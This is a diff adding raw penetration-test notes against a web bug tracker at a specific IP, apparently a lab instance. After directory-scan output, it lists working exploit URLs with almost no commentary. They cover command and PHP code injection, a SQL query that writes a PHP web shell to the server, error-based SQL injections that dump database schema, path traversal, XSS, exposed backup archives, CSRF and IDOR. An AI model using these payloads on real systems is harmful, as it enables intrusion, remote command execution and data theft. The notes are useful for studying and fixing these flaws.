@@ -1,0 +1,81 @@
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/core/
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/api/
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/doc/
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/robots.txt
+
+
+-------------------------------------------------------------------
+///dirb http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/
+
+==> DIRECTORY: http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/api/   
+==> DIRECTORY: http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/core/  
+==> DIRECTORY: http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/css/   
+==> DIRECTORY: http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/doc/   
+==> DIRECTORY: http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/images/
++ http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/index.php (CODE:302|SIZE:0)
+==> DIRECTORY: http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/javascript/
+==> DIRECTORY: http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/lang/  
++ http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/phpinfo.php (CODE:200|SIZE:51030)
+==> DIRECTORY: http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/phpmanual/
++ http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/robots.txt (CODE:200|SIZE:94)
++ http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/seed (CODE:200|SIZE:11)
+==> DIRECTORY: http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/tmp/   
+
+-------------------------------------------------------------------
+
+WSDL:
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/api/soap/dragonflyconnect.php?wsdl
+
+
+
+Finding:
+
+Command Injection:
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/index.php?bd=id
+
+Code Injection:
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/manage_proj_page.php?sort=']);}error_reporting(0);system('ls -al');%23
+
+Information Disclosure:
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/phpinfo.php
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/adminbak/upgrade_unattended.php?db_type=%27
+
+Report Issue -> Summary parameter is vulnerable to XSS
+
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/adminbak/upgrade_unattended.php?db_type=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/adminbak/upgrade_unattended.php?db_type=%3Cscript%3Ealert%281%29%3C/script%3E
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872//search.php?project_id=2
+
+News Headline and News Body parameter is vulnerable to XSS
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/news_add.php
+
+SQL Injection:
+
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/core/adodb/server.php?sql=SELECT%20%27%3C?%20system($_GET[\%27cmd\%27]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/65bd6d4a-0150-4ecd-98f3-7482692f7872/shell.php%27;
+
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/core/adodb/server.php?sql=(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
+
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/view_all_set.php?sort=id%2Cstatus%2Cseverity%2Cextractvalue%28null%2Cconcat%280x3a%2C%28SELECT%20group_concat%280x2D%2Ctable_schema%2C0x2E%2Ctable_name%2C0x2D%29%20FROM%20information_schema.tables%20WHERE%20table_schema%20%21%3D%200x6D7973716C%20AND%20table_schema%20%21%3D%200x696E666F726D6174696F6E5F736368656D61%29%2C0x3a%29%29%20--&dir=ASC,ASC,ASC&type=2
+
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/view_all_set.php?sort=0x69642c7374617475732c73657665726974792c6578747261637476616c7565286e756c6c2c636f6e63617428307833612c2853454c4543542067726f75705f636f6e63617428307832442c7461626c655f736368656d612c307832452c7461626c655f6e616d652c30783244292046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c6573205748455245207461626c655f736368656d6120213d2030783644373937333731364320414e44207461626c655f736368656d6120213d203078363936453636364637323644363137343639364636453546373336333638363536443631292c307833612929202d2d&dir=ASC,ASC,ASC&type=2
+
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/view_all_set.php?sort=id%2Cextractvalue%28null%2Cconcat%280x3a%2C%28SELECT%20group_concat%280x2D%2Ctable_schema%2C0x2E%2Ctable_name%2C0x2D%29%20FROM%20information_schema.tables%20WHERE%20table_schema%20%21%3D%200x6D7973716C%20AND%20table_schema%20%21%3D%200x696E666F726D6174696F6E5F736368656D61%29%2C0x3a%29%29%20--&dir=ASC,&type=2
+
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/search.php?project_id=0&sticky_issues=off&sortby=id%2Cstatus%2Cseverity%2Cextractvalue%28null%2Cconcat%280x3a%2C%28SELECT%20group_concat%280x2D%2Ctable_schema%2C0x2E%2Ctable_name%2C0x2D%29%20FROM%20information_schema.tables%20WHERE%20table_schema%20%21%3D%200x6D7973716C%20AND%20table_schema%20%21%3D%200x696E666F726D6174696F6E5F736368656D61%29%2C0x3a%29%29%20--&dir=DESC&hide_status_id=-2
+
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/core.php?mbadmin=
+
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/view_all_set.php?sort=id%2Cstatus%2Cseverity%2Cextractvalue(0x0a,concat(0x0a,(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)))--&dir=ASC,ASC,ASC&type=2 
+
+
+Backup found
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/backup.tgz
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/backup.zip
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/backup.tar.gz
+
+
+CSRF:
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/proj_doc_update.php
+
+IDOR
+http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/file_download.php?file_id=1&type=doc
